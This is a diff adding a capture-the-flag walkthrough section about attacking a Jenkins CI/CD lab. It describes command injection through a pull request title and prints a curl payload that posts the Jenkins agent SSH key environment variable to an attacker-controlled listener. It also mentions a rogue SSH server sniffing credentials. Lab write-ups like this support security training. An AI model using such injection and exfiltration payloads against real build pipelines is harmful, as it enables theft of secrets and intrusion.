@@ -200,12 +200,6 @@ The reason we needed tags was because Jenkins pull the repo files from the tags 
 
 ![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2Fe6aidlefEtLS7ww1xfuD%2Fimage.png?alt=media&token=4a5a1ae3-9fdd-45c2-ad82-10af0a81e80f)
 
-
-
-
-
-
-
 **Dodo** : 
 ![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2FqlPNd2hb3v90GissZrTO%2Fimage.png?alt=media)
 
@@ -286,12 +280,51 @@ Note: We use the Non Verifying Verfication strategy to prevent any kind of key b
 
 Now save this agent and let it run . Immediately you should see our rouge SSH sever doing an MiTM attack and sniffing the credentials ! here the password is  flag8 ! 
 
-![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2F6MwE9Xixk5iijNJL2wcd%2Fimage.png?alt=media&token=ba926940-c6e3-4a11-8211-2061dc148294) 
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2F6MwE9Xixk5iijNJL2wcd%2Fimage.png?alt=media&token=ba926940-c6e3-4a11-8211-2061dc148294)
+
+**Dormouse**  : 
+
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2FLGysF4AWZszdRlS6ekZA%2Fimage.png?alt=media&token=6b72ed4f-412c-47c8-b217-ce2844dfe28b) 
+
+There isn't much to work with from the challenge description. The Dormouse pipeline should be hacked and the flag9 stolen !. The hints from the challenge talk about a repository named ```reportcov``` which might be the way forward. Let's take a look at the Jenkins file of this repository ! 
+
+Examining the file reveals that their Jenkins uses the ```title``` of the pull request in a bash script to send mail _redqueen@localhost_.  There might be a possibility of a command injection here!.  
+
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2F0xZuXaO1tsmhFuBih1eV%2Fimage.png?alt=media&token=a92e4b56-66fd-4d1c-a9c5-16a8cdc412df) 
+
+
+Generally we could gain rce using this techique but let's pull interesting information from the server such as an SSH key from the env variables! ,because Jenkins likes the SSH keys to be stored in an env variable named  :   _JENKINSAGENTSSHPUBKEY_ . If we could access that we could use that key to modify the main branch and get the flag9! 
+
+Let's put that to practise . I'll fork the repo ,clone it and make some random changes.
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2FObbGYO89KeNSyC8IqnAA%2Fimage.png?alt=media&token=947c239a-4c70-41f7-86b4-22b3d11bbb9b) 
+
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2F1QeMgY14KINapWfbdvhU%2Fimage.png?alt=media&token=59a16bd3-902b-48a4-81cc-0e4d42fed7fb) 
+
+
+Submit a PR 
+
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2FDV3t9ptzNsezp0FbHVwA%2Fimage.png?alt=media&token=d8c180c5-471f-4a3a-8d5a-e5eddf0549ea)
+
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2FqTEr5MmtPjD0ixKkFyBo%2Fimage.png?alt=media&token=62e36e38-97cd-4be3-9bdc-ba4a535aa5f0) 
+
+Now modifying the title to a command injection payload :  
+``` `curl -H "Content-Type: application/json" -X POST -d '{"msg":"'" $JENKINS_AGENT_SSH_PUBKEY  "'"}' 192.168.222.175:9001/posts` ```  
 
 
 
 
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2FYIy2IpcEGFm0kJI5MAI4%2Fimage.png?alt=media&token=c88e301b-42c0-4b44-b2ff-5f7c3e110521) 
 
+Now we start a new a [json http server](https://github.com/typicode/json-server) to catch the ssh key coming our way . After a few seconds we see the remote server making a JSON request to us with the SSH keys !
+
+![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F0ozxUoEgqX8lSXt4wQpe%2Fuploads%2FX9xYt3Ckg0TPDnlZ4PZs%2Fimage.png?alt=media&token=78a1b7b3-939b-45b8-99f9-eb631bff2d1e)
+
+Note : I was unclear what to do once the SSH public key was obtained ! . So I left this challenge unsolved as I was able to proceed furthur as the solutions didn't help me much either ! 
+
+**Mock turtle**  : 
+
+
+ 
 
 
 
